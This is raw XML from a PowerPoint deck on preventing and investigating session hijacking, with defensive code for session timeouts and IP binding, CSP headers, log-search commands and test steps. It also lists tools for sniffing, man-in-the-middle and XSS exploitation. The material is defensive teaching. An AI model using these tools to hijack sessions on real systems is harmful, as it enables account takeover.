            <a:ext cx="3884414" cy="2737009"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2673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7343537" y="4502110"/>
            <a:ext cx="3884414" cy="6096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35" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9115604" y="4347329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E04F00"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9217640" y="4432340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472124" y="4800838"/>
            <a:ext cx="1488519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Session Timeout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472124" y="5050512"/>
            <a:ext cx="3627239" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 877"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7466528" y="5050512"/>
            <a:ext cx="3638431" cy="1939171"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 877"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7579876" y="5135523"/>
            <a:ext cx="3411736" cy="176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SESSION_TIMEOUT = 1800  # 30 minutes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check_session_timeout(session_id):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 = get_session(session_id)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current_time = time.time()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current_time - session.last_activity &gt; SESSION_TIMEOUT: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destroy_session(session_id)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# Update last activity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session.last_activity = current_time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93658" y="960596"/>
            <a:ext cx="5303877" cy="448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Advanced Prevention Techniques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593658" y="1533406"/>
            <a:ext cx="4680228" cy="3393877"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 605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2730460" y="1670209"/>
            <a:ext cx="410528" cy="410527"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22271582"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E04F0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3332" y="1783080"/>
            <a:ext cx="184666" cy="1846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30460" y="2163247"/>
            <a:ext cx="1796177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IP Address Binding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30460" y="2480667"/>
            <a:ext cx="4406622" cy="2309813"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 889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2723674" y="2480667"/>
            <a:ext cx="4420195" cy="2309813"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 889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2860477" y="2583299"/>
            <a:ext cx="4146590" cy="210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validate_session(session_id, request_ip):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 = get_session(session_id)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session.ip_address != request_ip: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Log suspicious activity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log_security_event("IP mismatch", session_id)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Optionally destroy session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destroy_session(session_id)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356396" y="1533406"/>
            <a:ext cx="4680347" cy="3393877"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 605"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7493198" y="1670209"/>
            <a:ext cx="410528" cy="410527"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22271582"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E04F0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06070" y="1783080"/>
            <a:ext cx="184666" cy="1846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3198" y="2163247"/>
            <a:ext cx="2272903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Multi-Factor Authentication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493198" y="2437328"/>
            <a:ext cx="4406741" cy="175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 if session is hijacked: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493198" y="2662238"/>
            <a:ext cx="4406741" cy="787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Require 2FA for sensitive operations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Re-authenticate for critical actions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Use device fingerprinting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Send notifications for new logins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593658" y="5009793"/>
            <a:ext cx="4680228" cy="2259092"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 909"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2730460" y="5146596"/>
            <a:ext cx="410528" cy="410527"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22271582"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E04F0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43332" y="5259467"/>
            <a:ext cx="184666" cy="18466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730460" y="5639633"/>
            <a:ext cx="2357080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 Security Policy (CSP)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2730460" y="5957054"/>
            <a:ext cx="4406622" cy="906780"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2264"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2723674" y="5957054"/>
            <a:ext cx="4420195" cy="906780"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2264"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2860477" y="6059686"/>
            <a:ext cx="4146590" cy="70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Content-Security-Policy: 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default-src 'self';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script-src 'self';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object-src 'none';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2730460" y="6956703"/>
            <a:ext cx="4406622" cy="175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Prevents XSS attacks that could steal cookies.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356396" y="5009793"/>
            <a:ext cx="4680347" cy="2259092"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 909"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EEEE"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7493198" y="5146596"/>
            <a:ext cx="410528" cy="410527"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 22271582"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E04F00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06070" y="5259467"/>
            <a:ext cx="184666" cy="18466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93198" y="5639633"/>
            <a:ext cx="1796177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Token Binding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493198" y="5913715"/>
            <a:ext cx="4406741" cy="175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Cryptographically bind session token to TLS connection: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7493198" y="6138624"/>
            <a:ext cx="4406741" cy="379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 Token only valid for specific TLS session</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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 Prevents token replay on different connection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5396" y="868799"/>
            <a:ext cx="5269587" cy="575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Response &amp; Investigation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65396" y="1498283"/>
            <a:ext cx="3709273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Response to Session Hijacking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1265396" y="1897737"/>
            <a:ext cx="2301478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Immediate Actions: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65396" y="2388632"/>
            <a:ext cx="12099608" cy="2025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Terminate affected sessions immediately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Reset session tokens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Force re-authentication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Notify affected users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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="5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access logs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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="6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attack vector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Font typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod" startAt="7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Patch vulnerabilities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265396" y="4617244"/>
            <a:ext cx="2301478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Investigation Steps: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65396" y="5108138"/>
            <a:ext cx="12099608" cy="2252663"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1168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1256705" y="5108138"/>
            <a:ext cx="12116991" cy="2252663"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1168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1431965" y="5239583"/>
            <a:ext cx="11766471" cy="1989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Analyze web server logs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grep "sessionid=abc123" /var/log/apache2/access.log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for multiple IPs using same session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awk '{print $1, $7}' access.log | grep "sessionid=abc123"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Review authentication logs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grep "authentication" /var/log/auth.log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282660" y="941784"/>
            <a:ext cx="4589978" cy="573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Testing &amp; Tools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1259800" y="1694736"/>
            <a:ext cx="45720" cy="5615821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3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1503164" y="1717596"/>
            <a:ext cx="2294930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Manual Testing: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03164" y="2085380"/>
            <a:ext cx="5727740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Cookie inspection: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03164" y="2380297"/>
            <a:ext cx="5727740" cy="1132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lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="◦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Check if cookies have Secure flag</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="1" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="◦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Check if cookies have HttpOnly flag</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="1" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="◦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Check if cookies have SameSite attribute</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="685800" lvl="1" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="1950"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="◦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Test if session ID is in URL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503164" y="3559969"/>
            <a:ext cx="5727740" cy="2029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 fixation test: - Obtain session ID before login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 Login with credentials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 Check if session ID changed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 If unchanged = vulnerable to fixation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 timeout test: - Login and note session ID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 Wait extended period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 Try using old session ID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 Should be rejected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376517" y="1694736"/>
            <a:ext cx="45720" cy="5615821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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7619881" y="1717596"/>
            <a:ext cx="3288030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Tools Used in Session Hijacking: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619881" y="2085380"/>
            <a:ext cx="5727859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Sniffing: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619881" y="2413992"/>
            <a:ext cx="5727859" cy="1132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Wireshark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tcpdump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Ettercap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Cain &amp; Abel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619881" y="3627358"/>
            <a:ext cx="5727859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MITM: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619881" y="3955971"/>
            <a:ext cx="5727859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mitmproxy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Bettercap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WiFi Pineapple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619881" y="4874419"/>
            <a:ext cx="5727859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XSS Exploitation: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619881" y="5203031"/>
            <a:ext cx="5727859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BeEF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XSSer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Burp Suite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619881" y="6121479"/>
            <a:ext cx="5727859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 Analysis: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619881" y="6450092"/>
            <a:ext cx="5727859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Burp Suite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OWASP ZAP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Cookie Cadger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1979</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>347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DM Sans</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>PT Serif</vt:lpstr>
      <vt:lpstr>PT Serif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2026-02-18T15:39:47Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-18T15:41:27Z</dcterms:modified>
</cp:coreProperties>
</file>